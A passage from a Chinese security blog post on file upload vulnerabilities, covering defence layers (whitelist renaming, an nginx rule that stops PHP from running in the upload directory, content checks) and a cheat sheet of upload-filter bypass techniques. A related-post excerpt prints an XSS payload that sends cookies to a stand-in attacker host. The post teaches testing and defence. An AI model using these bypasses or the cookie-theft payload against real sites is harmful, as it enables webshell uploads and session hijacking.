+<p><strong>第二层，存储与执行分离。</strong> 上传目录整体不接 PHP 解析——前缀匹配 <code>^~</code> 优先于 <code>\.php$</code> 这类正则，PHP 请求根本到不了 FPM，枚举后缀写 deny 反而容易漏（.phar、.pht）：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span><span class="regexp"> ^~</span> /uploads/ &#123;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>PHP-FPM 侧保持 security.limit_extensions 默认值不动，Apache 侧用 <code>&lt;FilesMatch &quot;\.php$&quot;&gt;</code> 配 SetHandler 替代 Add* 指令，并关闭上传目录的 AllowOverride。条件允许直接把文件转存 OSS 或独立存储域名，执行链从架构上不存在。</p>
+<p><strong>第三层，内容与架构校验。</strong> 白名单之外再过一遍文件头与图像合法性（注意 <code>getimagesize</code> 可被文件头伪装绕过，只作辅助）；图像处理管道及时升级——ImageMagick 的历史漏洞（ImageTragick）证明处理组件本身也是攻击面。</p>
+<p>完整的工程清单见 <a target="_blank" rel="noopener" href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a> 的防护建议与 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-upload">PortSwigger 的文件上传专题</a>（覆盖校验缺陷、路径穿越、服务端配置缺陷三类场景，附实验室）。</p>
+<h2 id="测试速查表"><a href="#测试速查表" class="headerlink" title="测试速查表"></a>测试速查表</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>先看什么</th>
+<th>优先尝试</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>只拦后缀</td>
+<td>黑名单还是白名单</td>
+<td><code>phtml</code>/<code>php3</code>、大小写、双写、<code>/.</code> 归一化</td>
+</tr>
+<tr>
+<td>拦 MIME</td>
+<td>是否只读 <code>Content-Type</code></td>
+<td>改包 <code>image/gif</code></td>
+</tr>
+<tr>
+<td>拦文件头</td>
+<td>只查头还是重采样</td>
+<td><code>GIF89a</code> 图片马；重采样用保留区构造</td>
+</tr>
+<tr>
+<td>白名单严格</td>
+<td>保存路径是否可控</td>
+<td>数组参数、老版本 <code>%00</code></td>
+</tr>
+<tr>
+<td>传上去不执行</td>
+<td>目录权限、解析配置</td>
+<td>中间件解析、文件包含链</td>
+</tr>
+<tr>
+<td>先存后删</td>
+<td>文件名是否可预测</td>
+<td>条件竞争（仅授权目标）</td>
+</tr>
+<tr>
+<td>名单/环境未知</td>
+<td>是否部署在 Nginx/Apache/IIS</td>
+<td>对应中间件解析特征探测</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>定位校验层占测试工作量的大头，绕过手法是定位之后的执行问题；防御侧真正起作用的是白名单重命名与存储执行分离，内容校验只作辅助。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.just-ok.xyz">just.ok</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.just-ok.xyz/posts/781eab3a/">http://blog.just-ok.xyz/posts/781eab3a/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://blog.just-ok.xyz" target="_blank">just.ok的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="post-meta__tags" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">中间件</a></div><div class="post-share"><div class="social-share" data-image="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/58a31e25/" title="源码泄露详解——.git、.svn、.hg 的原理、利用与工具"><img class="cover" src="https://pic1.imgdb.cn/item/6909bf6b3203f7be00cf703e.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">源码泄露详解——.git、.svn、.hg 的原理、利用与工具</div></div><div class="info-2"><div class="info-item-1">目录里有源码，不代表只有当前版本。Web 目录下出现 .git、.svn 或 .hg 这样的版本库元数据目录，说明部署时没剥离干净，探测到其中一个，往往能把整个开发历史、数据库密码和被注释掉的测试接口一起带回来。 先看最直接的一步探测： 12GET /.git/HEAD HTTP/1.1Host: example.com 返回 200 且内容是 ref: refs/heads/master，说明站点根目录下挂着一个 Git 仓库，.git 没被整体拦掉。不过一个文件可读推不出整个目录可读，接下来要确认 objects/ 和 index 能不能拿到——那才是恢复源码的依据。 成立条件与原理三类泄露的成因相同，三条同时满足即可利用：  版本库元数据目录被部署进了 Web 根目录——rsync/scp 整目录上传、IDE 直接发布、Git 挂目录部署都可能出现 Web 服务器没有对以点开头的目录做访问控制 版本库对象文件可读——恢复源码靠的就是逐个读取对象，不是读目录列表      版本系统 泄露目录 关键探测点 可恢复内容     Git /.git/ HEAD、config、log...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/2813c695/" title="XSS 漏洞详解——原理、类型、测试与绕过"><img class="cover" src="https://pic1.imgdb.cn/item/6908b7d53203f7be00cc7a0f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-27</div><div class="info-item-2">XSS 漏洞详解——原理、类型、测试与绕过</div></div><div class="info-2"><div class="info-item-1">站点搜索页的回显长这样：URL 是 https://example.com/search?q=键盘，页面显示「您搜索的是：键盘」。搜索词进了页面，这是一个注入点。 把参数换成一段 HTML： 1https://example.com/search?q=&lt;img src=x onerror=alert(1)&gt; 页面不再显示这段文字，而是弹出一个对话框。输入被原样输出成了标签：&lt;img&gt; 的 src=x 加载失败，触发 onerror 里的 alert(1)，浏览器把它当代码执行了。 再把 alert(1) 换成把 Cookie 发往外部服务器的脚本： 1&lt;img src=x onerror=&quot;new Image().src=&#x27;//attacker.example/log?c=&#x27;+document.cookie&quot;&gt; 这一次没有任何可见动静——访问这个链接的已登录用户，其 Cookie 已被发往攻击者的服务器。攻击者拿着 Cookie 就能以该用户身份登录：不需要密码，不需要服务器任何权限。 这两步就是 XSS...</div></div></div></a><a class="pagination-related" href="/posts/58a31e25/" title="源码泄露详解——.git、.svn、.hg 的原理、利用与工具"><img class="cover" src="https://pic1.imgdb.cn/item/6909bf6b3203f7be00cf703e.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-29</div><div class="info-item-2">源码泄露详解——.git、.svn、.hg 的原理、利用与工具</div></div><div class="info-2"><div class="info-item-1">目录里有源码，不代表只有当前版本。Web 目录下出现 .git、.svn 或 .hg 这样的版本库元数据目录，说明部署时没剥离干净，探测到其中一个，往往能把整个开发历史、数据库密码和被注释掉的测试接口一起带回来。 先看最直接的一步探测： 12GET /.git/HEAD HTTP/1.1Host: example.com 返回 200 且内容是 ref: refs/heads/master，说明站点根目录下挂着一个 Git 仓库，.git 没被整体拦掉。不过一个文件可读推不出整个目录可读，接下来要确认 objects/ 和 index 能不能拿到——那才是恢复源码的依据。 成立条件与原理三类泄露的成因相同，三条同时满足即可利用：  版本库元数据目录被部署进了 Web 根目录——rsync/scp 整目录上传、IDE 直接发布、Git 挂目录部署都可能出现 Web 服务器没有对以点开头的目录做访问控制 版本库对象文件可读——恢复源码靠的就是逐个读取对象，不是读目录列表      版本系统 泄露目录 关键探测点 可恢复内容     Git /.git/ HEAD、config、log...</div></div></div></a><a class="pagination-related" href="/posts/19ab467e/" title="SQL注入详解"><img class="cover" src="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c8.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-13</div><div class="info-item-2">SQL注入详解</div></div><div class="info-2"><div class="info-item-1">SQL注入的原理SQL注入的漏洞产生必须满足以下两个条件  参数用户可控：前端传给后端的参数内容是用户可以控制的。 参数代入数据库查询：传入的参数拼接到SQL语句，并且代入到数据库查询。  本篇中的数据库环境以MySQL为例。  MySQL的相关知识点在MySQL5.0之后，MySQL中默认添加了一个名为information_schema的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。 information_schema数据库中三个很重要的表：  information_schema.schemata: 该数据表存储了mysql数据库中的所有数据库的库名 information_schema.tables： 该数据表存储了mysql数据库中的所有数据表的表名 information_schema.columns: 该数据表存储了mysql数据库中的所有列的列名  mysql中注释符：# 、/**/ 、 -- mysql中常用的函数：  version()：查询数据库的版本user()：...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://pic1.imgdb.cn/item/67d9821888c538a9b5c04e57.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">just.ok</div><div class="author-info-description">just.ok的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">81</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/justook"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><center>🎉欢迎来到Jsutok小站🎉</center><br>
+网安小白一枚👻，在安全路上慢慢打怪升级，埋头挖洞、踩坑、复现漏洞。<br>
+<center><hr /></center>
+⚠️所有操作仅限授权测试环境，内容仅作安全学习交流，严禁用于非法测试，非法使用与本人无关。<br>
+<center><hr /></center>
+笔记只是个人理解，大佬路过轻点喷，发现代码或思路有问题，直接戳我，火速修改！🤡<br>
+<center><hr /></center>
+随缘更新，断更是常态，更新是惊喜✨<br>
+有时候忙着打靶，就会消失一阵子😴
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A%E5%AD%98%E8%BF%9B%E5%8E%BB%EF%BC%8C%E8%BF%98%E8%A6%81%E8%A2%AB%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理：存进去，还要被执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%EF%BC%9A%E5%85%88%E5%AE%9A%E4%BD%8D%E6%A0%A1%E9%AA%8C%E5%9C%A8%E5%93%AA%E4%B8%80%E5%B1%82"><span class="toc-number">2.</span> <span class="toc-text">测试流程：先定位校验在哪一层</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E4%B8%8E%E7%B1%BB%E5%9E%8B%E6%A0%A1%E9%AA%8C%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">后缀与类型校验的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E6%A0%A1%E9%AA%8C%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">内容校验与执行条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%B8%8E%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">中间件与解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3%E8%AF%84%E4%BC%B0%E4%B8%8E%E8%BE%B9%E7%95%8C"><span class="toc-number">6.</span> <span class="toc-text">危害评估与边界</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">7.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">8.</span> <span class="toc-text">测试速查表</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/781eab3a/" title="文件上传漏洞详解——原理、测试、绕过与防御"><img src="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞详解——原理、测试、绕过与防御"/></a><div class="content"><a class="title" href="/posts/781eab3a/" title="文件上传漏洞详解——原理、测试、绕过与防御">文件上传漏洞详解——原理、测试、绕过与防御</a><time datetime="2026-10-30T03:50:00.000Z" title="发表于 2026-10-30 11:50:00">2026-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/58a31e25/" title="源码泄露详解——.git、.svn、.hg 的原理、利用与工具"><img src="https://pic1.imgdb.cn/item/6909bf6b3203f7be00cf703e.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="源码泄露详解——.git、.svn、.hg 的原理、利用与工具"/></a><div class="content"><a class="title" href="/posts/58a31e25/" title="源码泄露详解——.git、.svn、.hg 的原理、利用与工具">源码泄露详解——.git、.svn、.hg 的原理、利用与工具</a><time datetime="2026-10-29T04:00:00.000Z" title="发表于 2026-10-29 12:00:00">2026-10-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3e3f274c/" title="从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解"><img src="https://pic1.imgdb.cn/item/6909bfe13203f7be00cf713f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解"/></a><div class="content"><a class="title" href="/posts/3e3f274c/" title="从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解">从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解</a><time datetime="2026-10-28T04:10:00.000Z" title="发表于 2026-10-28 12:10:00">2026-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2813c695/" title="XSS 漏洞详解——原理、类型、测试与绕过"><img src="https://pic1.imgdb.cn/item/6908b7d53203f7be00cc7a0f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS 漏洞详解——原理、类型、测试与绕过"/></a><div class="content"><a class="title" href="/posts/2813c695/" title="XSS 漏洞详解——原理、类型、测试与绕过">XSS 漏洞详解——原理、类型、测试与绕过</a><time datetime="2026-10-27T04:30:00.000Z" title="发表于 2026-10-27 12:30:00">2026-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e3f80a6/" title="Obsidian 上手指南——从建库到长期可用"><img src="https://pic1.imgdb.cn/item/6909bf693203f7be00cf7039.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Obsidian 上手指南——从建库到长期可用"/></a><div class="content"><a class="title" href="/posts/e3f80a6/" title="Obsidian 上手指南——从建库到长期可用">Obsidian 上手指南——从建库到长期可用</a><time datetime="2026-10-26T09:20:00.000Z" title="发表于 2026-10-26 17:20:00">2026-10-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨</div><div class="btn-xz-box"><a class="btn-xz" href="javascript:toRandomPost()">点击开启星辰之旅</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">猜你想看💡</p><ul class="ft-links"><li><a href="https://blog.just-ok.xyz/archives/Hexo-Github-Vercel-DeploymentTutorial.html">建站指南</a><a href="https://blog.just-ok.xyz/link">网址导航</a></li><li><a href="https://blog.just-ok.xyz/">来杯咖啡</a><a href="https://blog.just-ok.xyz/comments">留点什么</a></li><li><a href="https://blog.just-ok.xyz/about">关于博主</a><a target="_blank" rel="noopener" href="https://fe32.top/archives/">文章归档</a></li><li><a href="https://blog.just-ok.xyz/categories">文章分类</a><a href="https://blog.just-ok.xyz/tags">文章标签</a></li><li><a href="https://blog.just-ok.xyz/Gallery/">我的相册</a><a href="https://blog.just-ok.xyz/">我的追番</a></li><li><a href="https://blog.just-ok.xyz/">一些特效</a><a href="https://blog.just-ok.xyz/">一些壁纸</a></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链</p><div class="ft-img-group"><div class="img-group-item"><a target="_blank" rel="noopener" href="https://blog.id-zyuan.xyz/"><img src="https://pic1.imgdb.cn/item/6829891e58cb8da5c8fabff0.png" alt="zhaoyuan" title="zhaoyuan"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://qinghuidaqzp.github.io/"><img src="https://pic1.imgdb.cn/item/6922f8033203f7be00255c87.jpg" alt="qinghuidaqzp" title="qinghuidaqzp"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://www.muooy.com/"><img src="https://www.muooy.com/favicon.png" alt="大理鱼儿" title="大理鱼儿"/></a></div><div class="img-group-item"><a target="_blank" href="https://blog.elykia.cn/" rel="external nofollow noreferrer noopener noopener"><img src="https://bu.dusays.com/2024/10/25/671b2438203a6.gif" alt="Elykia" title="Elykia"/></a></div><div class="img-group-item"><a target="_blank" href="https://blog.fiveth.cc/" rel="external nofollow noreferrer noopener noopener"><img src="https://p.fiveth.cc/avatar.png" alt="Fiveth" title="Fiveth"/></a></div></div></div></div><div class="copyright">&copy;2024 - 2026  <i id="heartbeat" class="fa fas fa-heartbeat"></i> just.ok</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><script type="text/javascript" src="/js/post-list.js"></script><script type="text/javascript" src="/js/daliyuer.js"></script><script async data-pjax src="https://events.vercount.one/js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_categories_card_injector_config(){
+    // 检查容器是否存在
+    var parent_div_git = document.getElementById('recent-posts');
+    // 如果容器不存在，则动态创建
+    if (!parent_div_git) {
+      console.warn('butterfly_categories_card: 挂载容器不存在，正在动态创建...');
+      // 创建新容器（默认插入到页面主体顶部）
+      parent_div_git = document.createElement('div');
+      parent_div_git.id = 'recent-posts'; // 赋予配置的ID
+      document.querySelector('#page').prepend(parent_div_git); // 插入到 #content-inner 内
+    }
+    var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 950px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 800px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7955.jpg);"> <a class="categoryBar-list-link" href="/categories/密码学/">密码学</a><span class="categoryBar-list-count">6</span><span class="categoryBar-list-descr">1</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7957.jpg);"> <a class="categoryBar-list-link" href="/categories/数据结构与算法/">数据结构与算法</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr">2</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7958.jpg);"> <a class="categoryBar-list-link" href="/categories/项目作品/">项目作品</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr">3</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc795a.jpg);"> <a class="categoryBar-list-link" href="/categories/随笔/">随笔</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr">4</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7956.jpg);"> <a class="categoryBar-list-link" href="/categories/建站与运维/">建站与运维</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr">5</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7233203f7be00cc7959.jpg);"> <a class="categoryBar-list-link" href="/categories/渗透测试/">渗透测试</a><span class="categoryBar-list-count">5</span><span class="categoryBar-list-descr">6</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7a43203f7be00cc79cf.jpg);"> <a class="categoryBar-list-link" href="/categories/数据安全与隐私/">数据安全与隐私</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr">7</span></li><li class="categoryBar-list-item" style="background:url(https://pic1.imgdb.cn/item/6908b7a43203f7be00cc79ce.jpg);"> <a class="categoryBar-list-link" href="/categories/知识库/">知识库</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr">8</span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/开发环境/">开发环境</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/操作系统/">操作系统</a><span class="categoryBar-list-count">5</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/工具与效率/">工具与效率</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/逆向工程/">逆向工程</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/机器学习/">机器学习</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" href="/categories/计算机网络/">计算机网络</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr"></span></li></ul></div></div>';
+    console.log('已挂载 butterfly_categories_card');
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+  }
+  // 路径匹配逻辑（使用 startsWith）
+  if (location.pathname.startsWith('/categories/') || '/categories/' === 'all') {
+    butterfly_categories_card_injector_config();
+  }
+  </script><!-- hexo injector body_end end --></body></html>
